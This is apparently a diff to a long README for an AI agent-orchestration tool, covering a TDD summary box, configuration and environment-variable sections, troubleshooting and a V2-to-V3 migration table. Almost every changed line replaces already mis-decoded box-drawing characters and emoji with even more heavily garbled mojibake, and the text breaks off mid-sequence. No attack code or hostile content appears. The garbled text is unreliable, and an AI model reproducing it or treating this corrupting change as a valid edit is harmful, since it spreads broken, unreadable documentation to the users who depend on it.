+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                  LONDON SCHOOL TDD                           ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€œÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¤
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  1. ARRANGE - Set up mocks BEFORE acting                     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  2. ACT     - Execute the behavior under test                ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  3. ASSERT  - Verify behavior (interactions), not state      ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                              ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  "Test behavior, not implementation"                         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  "Mock external dependencies, test interactions"             ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
 ```
 
 ### Quick Start
@@ -6939,12 +6939,12 @@ console.log(TEST_CONFIG.AGENTDB_SEARCH_IMPROVEMENT_MAX); // 12500
 
 ---
 
-## Ã¢Å¡â„¢Ã¯Â¸Â Configuration & Reference
+## ÃƒÂ¢Ã…Â¡Ã¢â€žÂ¢ÃƒÂ¯Ã‚Â¸Ã‚Â Configuration & Reference
 
 Environment setup, configuration options, and platform support.
 
 <details>
-<summary>Ã°Å¸â€™Â» <strong>Cross-Platform Support</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â» <strong>Cross-Platform Support</strong></summary>
 
 
 ### Windows (PowerShell)
@@ -6973,7 +6973,7 @@ export CLAUDE_FLOW_MEMORY_PATH="./data"
 ---
 
 <details>
-<summary>Ã¢Å¡â„¢Ã¯Â¸Â <strong>Environment Variables</strong></summary>
+<summary>ÃƒÂ¢Ã…Â¡Ã¢â€žÂ¢ÃƒÂ¯Ã‚Â¸Ã‚Â <strong>Environment Variables</strong></summary>
 
 ### Core Configuration
 
@@ -7113,7 +7113,7 @@ CLAUDE_FLOW_HNSW_EF=200
 ---
 
 <details>
-<summary>Ã°Å¸â€œâ€ž <strong>Configuration Reference</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã¢â‚¬Å¾ <strong>Configuration Reference</strong></summary>
 
 ### Configuration File Location
 
@@ -7367,12 +7367,12 @@ npx ruflo@latest init wizard
 
 ---
 
-## Ã°Å¸â€œâ€“ Help & Resources
+## ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã¢â‚¬â€œ Help & Resources
 
 Troubleshooting, migration guides, and documentation links.
 
 <details>
-<summary>Ã°Å¸â€Â§ <strong>Troubleshooting</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â§ <strong>Troubleshooting</strong></summary>
 
 
 ### Common Issues
@@ -7432,21 +7432,21 @@ export CLAUDE_FLOW_HNSW_EF=100
 ---
 
 <details>
-<summary>Ã°Å¸â€â€ž <strong>Migration Guide (V2 Ã¢â€ â€™ V3)</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â‚¬Å¾ <strong>Migration Guide (V2 ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ V3)</strong></summary>
 
 ### Why Migrate to V3?
 
 ```
-Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â
-Ã¢â€â€š                    V2 Ã¢â€ â€™ V3 IMPROVEMENTS                     Ã¢â€â€š
-Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¤
-Ã¢â€â€š Memory Search         Ã¢â€â€š 150x - 12,500x faster (HNSW)        Ã¢â€â€š
-Ã¢â€â€š Pattern Matching      Ã¢â€â€š Self-learning (ReasoningBank)       Ã¢â€â€š
-Ã¢â€â€š Security              Ã¢â€â€š CVE remediation + strict validation Ã¢â€â€š
-Ã¢â€â€š Modular Architecture  Ã¢â€â€š 18 @claude-flow/* packages          Ã¢â€â€š
-Ã¢â€â€š Agent Coordination    Ã¢â€â€š 16 specialized agent roles + custom types              Ã¢â€â€š
-Ã¢â€â€š Token Efficiency      Ã¢â€â€š 32% reduction with optimization     Ã¢â€â€š
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â´Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                    V2 ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ V3 IMPROVEMENTS                     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€œÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬Ãƒ